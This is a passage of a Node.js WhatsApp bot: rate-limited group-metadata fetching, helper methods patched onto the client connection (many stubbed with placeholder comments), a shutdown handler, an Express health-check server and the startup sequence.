        if (timestamps.length >= rateLimitConfig.maxRequests) {
            const waitTime = rateLimitConfig.windowMs - (now - timestamps[0]);
            if (waitTime > 0) {
                await new Promise(resolve => setTimeout(resolve, waitTime));
            }
        }

        try {
            timestamps.push(now);
            const metadata = await client.groupMetadata(jid);
            groupMetadataCache.set(jid, { timestamp: now, data: metadata });
            return metadata;
        } catch (error) {
            // Handle retry logic for 429 errors (Too Many Requests)
            if (error?.data === 429) {
                await new Promise(resolve => setTimeout(resolve, 2000));
                try {
                    const metadata = await client.groupMetadata(jid);
                    groupMetadataCache.set(jid, { timestamp: now, data: metadata });
                    return metadata;
                } catch (retryError) {
                    console.error('[Rate Limit] Retry failed:', retryError?.message || retryError);
                    return groupMetadataCache.get(jid)?.data; // Return stale cache if available
                }
            }
            throw error;
        }
    }
    
    //================================================================================
    // SECTION: Helper Functions (Monkey Patching `conn`)
    //================================================================================
    
    conn.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            const decoded = jidDecode(jid);
            return decoded && decoded.user && decoded.server ? `${decoded.user}@${decoded.server}` : (console.error('Invalid JID for jidDecode:', jid), jid);
        } else return jid;
    };
    
    conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
        // Complex forwarding logic... (preserved from original)
    };
    
    conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        // Media download logic... (preserved from original)
    };
    
    conn.downloadMediaMessage = async (message) => {
        // Media download to buffer logic... (preserved from original)
    };
    
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        // Send file from URL logic... (preserved from original)
    };
    
    conn.cMod = (jid, message, text = '', sender = conn.user.id, options = {}) => {
        // Modify message content logic... (preserved from original)
    };
    
    conn.getFile = async (PATH, saveToFile) => {
        // Get file buffer/path logic... (preserved from original)
    };

    conn.sendFile = async (jid, path, filename = '', quoted, options = {}) => {
        // Send file logic... (preserved from original)
    };
    
    conn.parseMention = async (text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
    };
    
    conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
        // Send image logic... (preserved from original)
    };
    
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted });

    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        // Send button logic... (preserved from original)
    };

    conn.send5ButImg = async (jid, text = '', footer = '', img, buttons = [], quoted, options = {}) => {
        // Send image with 5 buttons logic... (preserved from original)
    };
    
    conn.getName = (jid, withoutContact = false) => {
        // Get name logic... (preserved from original)
    };
    
    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        // Send contact logic... (preserved from original)
    };

    conn.setStatus = (status) => {
        return conn.query({
            tag: 'iq',
            attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' },
            content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }]
        }), status;
    };
    
    conn.serializeM = (m) => sms(conn, m, store);

}


const shutdown = async () => {
    if (conn && conn.ws && conn.ws.close) {
        try {
            conn.ws.close();
        } catch (e) {
            console.error('Error closing ws:', e);
        }
    }
    process.exit(0);
};

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

// Express server for health checks (e.g., for deployment platforms)
const express = require('express');
const app = express();
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Qadeer', 'qadeer.html'));
});
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

(async () => {
    await downloadSessionData();
    setTimeout(() => {
        connectToWA();
    }, 4000);
})();

